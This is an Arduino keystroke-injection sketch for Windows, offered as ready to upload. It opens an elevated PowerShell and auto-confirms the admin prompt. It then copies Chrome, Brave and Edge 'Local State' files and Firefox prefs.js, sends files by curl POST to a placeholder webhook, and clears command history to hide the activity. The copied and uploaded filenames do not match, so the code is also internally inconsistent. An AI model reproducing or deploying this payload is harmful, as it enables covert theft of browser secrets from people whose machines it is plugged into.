//Direct upload in arduino and it will work :)
//Only setback is that it will take more time than my updated one.

#include "Keyboard.h"
void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}
void setup() {

  Keyboard.begin();
  delay(500);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('m');
  Keyboard.releaseAll();
  delay(1500);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.print("powershell");
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(2100);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('y');
  Keyboard.releaseAll();
  Keyboard.press(KEY_RETURN);
  delay(500);
  Keyboard.releaseAll();
  Keyboard.print("cmd");
  Keyboard.press(KEY_RETURN);Keyboard.releaseAll();
  delay(1000);
  Keyboard.print("cd C:/");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.print("copy \"%LocalAppData%\\Google\\Chrome\\User Data\\Local State\" chrotxt");
  Keyboard.press(KEY_RETURN); Keyboard.releaseAll();
  delay(500);
  Keyboard.print("copy \"%LocalAppData%\\BraveSoftware\\Brave-Browser\\User Data\\Local State\" brave.txt");
  Keyboard.press(KEY_RETURN); Keyboard.releaseAll();
  delay(500); 
  Keyboard.print("copy \"%LocalAppData%\\Microsoft\\Edge\\User Data\\Local State\" edg.txt");
  Keyboard.press(KEY_RETURN); Keyboard.releaseAll();
  delay(500);
  Keyboard.print("copy \"%AppData%\\Mozilla\\Firefox\\Profiles\\*.default\\prefs.js\" fire.txt");
  Keyboard.press(KEY_RETURN); Keyboard.releaseAll();
  delay(500);
  Keyboard.print("curl -X POST -H \"Content-Type: multipart/form-data\" -F \"file1=@ccls.txt\" [WEBHOOK URL]");
  delay(1000);
  Keyboard.press(KEY_RETURN); Keyboard.releaseAll();
  delay(1900);
  Keyboard.print("curl -X POST -H \"Content-Type: multipart/form-data\" -F \"file2=@bbls.txt\" [WEBHOOK URL]");
  delay(1000);
  Keyboard.press(KEY_RETURN); Keyboard.releaseAll();
  delay(1900);
  Keyboard.print("curl -X POST -H \"Content-Type: multipart/form-data\" -F \"file3=@eels.txt\" [WEBHOOK URL]");
  delay(1000);
  Keyboard.press(KEY_RETURN); Keyboard.releaseAll();
  delay(1900);
  Keyboard.print("curl -X POST -H \"Content-Type: multipart/form-data\" -F \"file4=@ffls.txt\" [WEBHOOK URL]");
  delay(1000);
  Keyboard.press(KEY_RETURN); Keyboard.releaseAll();
  delay(1900);
  Keyboard.print("doskey /reinstall");
  delay(500);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.print("exit");
  delay(200);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(500);
  Keyboard.print("Clear-History");
  delay(200);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(500);
  Keyboard.print("exit");
  delay(200);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  


}

void loop() {
  // put your main code here, to run repeatedly:

}